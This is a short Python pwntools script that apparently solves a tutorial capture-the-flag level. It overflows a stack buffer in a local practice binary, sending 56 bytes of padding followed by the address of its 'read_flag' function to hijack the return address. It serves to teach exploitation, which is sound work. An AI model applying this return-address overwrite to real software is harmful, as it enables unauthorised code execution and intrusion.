#!/usr/bin/env python3
from pwn import *

binary = "./pwntools-tutorials-level4.0"
elf = ELF(binary)

# NOTE: if the binary is PIE, you must set `elf.address` to the runtime base
# after starting the process and leaking the base. Example:
# p = process(elf.path)
# base = ...  # leak or compute base
# elf.address = base

read_flag_addr = elf.symbols['read_flag']

# build payload (replace the 'A' * OFFSET with the real offset you discovered)
OFFSET = 56   # <-- replace with the correct offset to saved RIP
payload = b'A' * OFFSET + p64(read_flag_addr)

p = process(binary)

# sendafter waits for the given delimiter then sends payload
# adjust the delimiter if the program prints it differently
try:
    p.sendafter(b"Give me your input\n", payload)
except EOFError:
    # target closed connection early
    pass

# helper to print any output until nothing more arrives
def print_lines(proc, timeout=1):
    while True:
        try:
            line = proc.recvline(timeout=timeout)
        except EOFError:
            break
        if not line:
            break
        # decode safely
        print(line.decode(errors='replace'), end='')

print_lines(p)
p.interactive()

